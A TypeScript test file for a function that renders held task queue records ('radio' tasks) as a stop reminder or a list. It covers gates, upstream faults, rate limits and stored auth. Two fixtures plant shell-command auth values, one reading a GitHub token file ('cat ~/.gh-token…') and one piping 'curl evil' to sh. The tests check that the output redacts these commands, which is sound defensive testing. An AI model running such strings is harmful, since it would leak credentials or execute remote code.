import { given, then, when } from 'test-fns';

import { RadioChannel } from '@src/domain.objects/RadioChannel';
import { RadioTaskRecord } from '@src/domain.objects/RadioTaskRecord';
import { RadioTaskRecordStatus } from '@src/domain.objects/RadioTaskRecordStatus';
import { RadioTaskRepo } from '@src/domain.objects/RadioTaskRepo';

import { asRadioHeldOutput } from './asRadioHeldOutput';

const genRecord = (input: {
  title: string;
  reason?: string;
}): RadioTaskRecord =>
  new RadioTaskRecord({
    key: input.title,
    kind: 'create',
    repo: new RadioTaskRepo({ owner: 'ehmpathy', name: 'rhachet' }),
    via: RadioChannel.GH_ISSUES,
    auth: null,
    idem: null,
    title: `task ${input.title}`, // apart from the key, so a row never reads `a a`
    description: 'details',
    exid: null,
    status: null,
    recordStatus: RadioTaskRecordStatus.QUEUED,
    reason: input.reason ?? 'radio.uses:blocked — global',
    heldSeq: 1,
    deliveredExid: null,
  });

describe('asRadioHeldOutput', () => {
  given('[case1] three tasks held, the gate shut (S2)', () => {
    const held = ['a', 'b', 'c'].map((title) => ({
      record: genRecord({ title }),
      lift: 'rhx radio.uses --global allow',
    }));

    when('[t0] the stop reminder renders', () => {
      const output = asRadioHeldOutput({ held, mode: 'hook.onStop' });

      then('it is one line with the count by state and the lift', () => {
        expect(output).toEqual(
          '🦫 3 tasks held for the radio · 3 at a gate · lift: rhx radio.uses --global allow · next push delivers them',
        );
        expect(output).toMatchSnapshot();
      });
    });

    when('[t1] the list renders', () => {
      const output = asRadioHeldOutput({ held, mode: 'list' });

      then('it lists each held task with its state and its lift', () => {
        expect(output).toContain('🦫 held for the radio');
        expect(output).toContain(
          'a task a → ehmpathy/rhachet\n   │  ├─ state: held at gate (radio.uses:blocked — global)',
        );
        expect(output).toContain(
          'lift it (human): rhx radio.uses --global allow',
        );
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case2] one task held, the gate open (S3)', () => {
    when('[t0] the stop reminder renders', () => {
      const output = asRadioHeldOutput({
        held: [{ record: genRecord({ title: 'a' }), lift: null }],
        mode: 'hook.onStop',
      });

      then('it says the radio is open and the next push delivers it', () => {
        expect(output).toEqual(
          '🦫 1 task held, the radio is open · next push delivers it',
        );
        expect(output).toMatchSnapshot();
      });
    });

    when('[t1] the list renders (L3)', () => {
      const output = asRadioHeldOutput({
        held: [{ record: genRecord({ title: 'a' }), lift: null }],
        mode: 'list',
      });

      then('it lists the task with no lift, and says the radio is open', () => {
        expect(output).toContain('a → ehmpathy/rhachet');
        expect(output).toContain(
          'state: not reached (last held: radio.uses:blocked — global; since opened)',
        );
        expect(output).not.toContain('lift it (human):');
        expect(output).toContain(
          'the radio is open, so the next push, or `rhx radio.task.queue drain`, delivers the backlog',
        );
        expect(output).toMatchSnapshot();
      });
    });
  });

  given(
    '[case2.1] two tasks set aside on an upstream fault, a third held at a shut gate',
    () => {
      const held = [
        {
          record: genRecord({ title: 'a', reason: 'upstream:auth' }),
          lift: null,
        },
        {
          record: genRecord({ title: 'b', reason: 'upstream:auth' }),
          lift: null,
        },
        {
          record: genRecord({ title: 'c' }),
          lift: 'rhx radio.uses --global allow',
        },
      ];

      when('[t0] the stop reminder renders', () => {
        const output = asRadioHeldOutput({ held, mode: 'hook.onStop' });

        then(
          'it names the fault once beside the lift, never "the radio is open"',
          () => {
            expect(output).toEqual(
              '🦫 3 tasks held for the radio · 1 at a gate · 2 set aside (upstream:auth) · lift: rhx radio.uses --global allow · see each fix: rhx radio.task.queue get',
            );
            expect(output).not.toContain('fix: upstream:');
            expect(output).not.toContain('the radio is open');
            expect(output).not.toContain('next push delivers');
            expect(output).toMatchSnapshot();
          },
        );
      });

      when('[t1] the list renders', () => {
        const output = asRadioHeldOutput({ held, mode: 'list' });

        then(
          'it names each set-aside record with its fault and its fixes',
          () => {
            expect(output).toContain('state: set aside (upstream:auth)');
            expect(output).toContain(
              'amend it: rhx radio.task.queue set --uuid a',
            );
            expect(output).toContain(
              'amend it: rhx radio.task.queue set --uuid b',
            );
            expect(
              output!.match(/state: set aside \(upstream:auth\)/g),
            ).toHaveLength(2);
            expect(output).toContain(
              'lift it (human): rhx radio.uses --global allow',
            );
            expect(output).not.toContain('the radio is open');
            expect(output).toMatchSnapshot();
          },
        );
      });
    },
  );

  given('[case2.2] a task halted on a rate limit, the gate open', () => {
    const held = [
      {
        record: genRecord({ title: 'a', reason: 'upstream:rate-limit' }),
        lift: null,
      },
    ];

    when('[t0] the stop reminder renders', () => {
      const output = asRadioHeldOutput({ held, mode: 'hook.onStop' });

      then('it counts it halted, with no bare code as a fix', () => {
        expect(output).toEqual(
          '🦫 1 task held for the radio · 1 halted (upstream:rate-limit) · the next drain retries it',
        );
        expect(output).not.toContain('fix:');
        expect(output).toMatchSnapshot();
      });
    });

    when('[t1] the list renders', () => {
      const output = asRadioHeldOutput({ held, mode: 'list' });

      then('it names the halt, with no amend or drop lines', () => {
        expect(output).toContain('state: halted (upstream:rate-limit)');
        expect(output).not.toContain('amend it:');
        expect(output).not.toContain('or drop it:');
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case2.3] two updates to one issue, the first set aside', () => {
    const genUpdate = (input: { key: string; reason: string }) =>
      new RadioTaskRecord({
        ...genRecord({ title: input.key, reason: input.reason }),
        kind: 'update',
        title: null,
        exid: '599',
      });
    const ahead = genUpdate({
      key: 'a1a1a1a1a1a1a1a1',
      reason: 'upstream:access',
    });
    const behind = genUpdate({
      key: 'b2b2b2b2b2b2b2b2',
      reason: 'behind:a1a1a1a1a1a1a1a1 (same issue #599)',
    });

    when('[t0] the list renders, the record ahead still held', () => {
      const output = asRadioHeldOutput({
        held: [
          { record: ahead, lift: null },
          { record: behind, lift: null },
        ],
        mode: 'list',
      });

      then('the record behind names the record ahead, never gate words', () => {
        expect(output).toContain(
          'state: waits behind a1a1a1a1a1a1a1a1 (same issue #599)',
        );
        expect(output).toContain('fix a1a1a1a1a1a1a1a1 above');
        expect(output).not.toContain('since opened');
        expect(output).not.toContain(
          'rhx radio.task.queue set --uuid b2b2b2b2b2b2b2b2',
        );
        expect(output).toMatchSnapshot();
      });
    });

    when('[t1] the stop reminder renders, the record ahead still held', () => {
      const output = asRadioHeldOutput({
        held: [
          { record: ahead, lift: null },
          { record: behind, lift: null },
        ],
        mode: 'hook.onStop',
      });

      then('it counts the record behind as a wait, not a fault', () => {
        expect(output).toEqual(
          '🦫 2 tasks held for the radio · 1 set aside (upstream:access) · 1 behind an earlier update to the same issue · see each fix: rhx radio.task.queue get',
        );
        expect(output).toMatchSnapshot();
      });
    });

    when('[t2] the list renders, the record ahead since dropped', () => {
      const output = asRadioHeldOutput({
        held: [{ record: behind, lift: null }],
        mode: 'list',
      });

      then('the stale wait reads as re-checked on next drain', () => {
        expect(output).toContain(
          'state: not reached (was behind a1a1a1a1a1a1a1a1, no longer held; re-checked on next drain)',
        );
        expect(output).not.toContain('waits behind');
        expect(output).toMatchSnapshot();
      });

      then('the footer says the radio is open', () => {
        expect(output).toContain('the radio is open');
      });
    });

    when(
      '[t3] the list renders, the record ahead just amended (no fault on it)',
      () => {
        const output = asRadioHeldOutput({
          held: [
            {
              record: new RadioTaskRecord({
                ...ahead,
                auth: 'as-human',
                reason: null,
              }),
              lift: null,
            },
            { record: behind, lift: null },
          ],
          mode: 'list',
        });

        then(
          'the record behind says it sends right after, never to fix it again',
          () => {
            expect(output).toContain(
              'state: waits behind a1a1a1a1a1a1a1a1 (same issue #599)',
            );
            expect(output).toContain(
              'sends right after a1a1a1a1a1a1a1a1 on the next drain',
            );
            expect(output).not.toContain('fix a1a1a1a1a1a1a1a1 above');
            expect(output).toMatchSnapshot();
          },
        );
      },
    );
  });

  given('[case2.4] a halter and a record held unsent behind it', () => {
    const held = [
      {
        record: genRecord({ title: 'a', reason: 'upstream:rate-limit' }),
        lift: null,
      },
      {
        record: genRecord({ title: 'b', reason: 'upstream:rate-limit' }),
        lift: null,
      },
    ];

    when('[t0] the list renders', () => {
      const output = asRadioHeldOutput({ held, mode: 'list' });

      then(
        'only the first reads halted; the second reads behind the halt',
        () => {
          expect(output).not.toBeNull();
          expect(output!.match(/state: halted/g)).toHaveLength(1);
          expect(output).toContain(
            'state: behind the halt (upstream:rate-limit): unsent, still in line',
          );
          expect(output).toMatchSnapshot();
        },
      );
    });

    when('[t1] the stop reminder renders', () => {
      const output = asRadioHeldOutput({ held, mode: 'hook.onStop' });

      then('it counts the halter and the record behind it apart', () => {
        expect(output).toEqual(
          '🦫 2 tasks held for the radio · 1 halted (upstream:rate-limit) · 1 behind the halt · the next drain retries them',
        );
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case3] no task held (S1)', () => {
    when('[t0] the stop reminder renders', () => {
      then('it renders naught', () => {
        expect(asRadioHeldOutput({ held: [], mode: 'hook.onStop' })).toBeNull();
      });
    });

    when('[t1] the list renders', () => {
      then('it says naught is held', () => {
        const output = asRadioHeldOutput({ held: [], mode: 'list' });
        expect(output).toEqual('🦫 naught held for the radio');
        expect(output).toMatchSnapshot();
      });
    });
  });

  given(
    '[case9] held records with a stored auth, one of which no drain will replay',
    () => {
      const held = [
        {
          record: new RadioTaskRecord({
            ...genRecord({ title: 'amended' }),
            auth: 'as-human',
          }),
          lift: 'rhx radio.uses --global allow',
        },
        {
          record: new RadioTaskRecord({
            ...genRecord({ title: 'shelled' }),
            auth: "as-robot:shx(cat ~/.gh-token-o'neil)",
          }),
          lift: 'rhx radio.uses --global allow',
        },
        {
          record: genRecord({ title: 'plain' }),
          lift: 'rhx radio.uses --global allow',
        },
      ];

      when('[t0] the list renders', () => {
        const output = asRadioHeldOutput({ held, mode: 'list' });

        then('each row names the auth it holds, default when none', () => {
          expect(output).toContain('auth: as-human');
          expect(output).toContain(
            'auth: default (as-robot:via-keyrack(ehmpath))',
          );
        });

        then(
          'the row whose auth will not replay says so once, with an amend line that holds a placeholder',
          () => {
            expect(output).toContain(
              `amend its auth (human): rhx radio.task.queue set --uuid ${held[1]!.record.key} --auth <auth>`,
            );
            expect(output).toContain('auth: as-robot:shx(…), will not replay');
            expect(output).not.toContain('gh-token');
            expect(output).not.toContain('you type');
            expect(output!.match(/will not replay/g)).toHaveLength(1);
            expect(output).toMatchSnapshot();
          },
        );
      });
    },
  );

  given(
    '[case10] a held record merged in with a planted shell auth (r10 blocker.1)',
    () => {
      const held = [
        {
          record: new RadioTaskRecord({
            ...genRecord({ title: 'planted' }),
            auth: 'as-robot:shx(curl evil|sh)',
          }),
          lift: 'rhx radio.uses --global allow',
        },
      ];

      when('[t0] the list renders', () => {
        const output = asRadioHeldOutput({ held, mode: 'list' });

        then(
          'no line carries the planted command, in a fix or a display',
          () => {
            expect(output).not.toContain('curl evil');
            expect(output).toContain('auth: as-robot:shx(…), will not replay');
            expect(output).toContain('--auth <auth>');
            expect(output).toMatchSnapshot();
          },
        );
      });
    },
  );

  given(
    '[case11] two set-aside records whose fix is not an amend: one already as-human, one an unknown fault',
    () => {
      const held = [
        {
          record: new RadioTaskRecord({
            ...genRecord({ title: 'human', reason: 'upstream:401' }),
            auth: 'as-human',
          }),
          lift: null,
        },
        {
          record: genRecord({ title: 'odd', reason: 'upstream:fault' }),
          lift: null,
        },
      ];

      when('[t0] the list renders', () => {
        const output = asRadioHeldOutput({ held, mode: 'list' });

        then(
          'the as-human row names the gh login, never a second as-human amend',
          () => {
            expect(output).toContain(
              'check the gh login on this host: gh auth status (else: gh auth login), then: rhx radio.task.queue drain',
            );
            expect(output).not.toContain('--uuid human --auth as-human');
          },
        );

        then(
          'the unknown-fault row says the drain retries it, and that a drain writes',
          () => {
            expect(output).toContain(
              'retry it and print its fault: rhx radio.task.queue drain (this sends every held record whose gate is open)',
            );
            expect(output).toMatchSnapshot();
          },
        );
      });
    },
  );
});
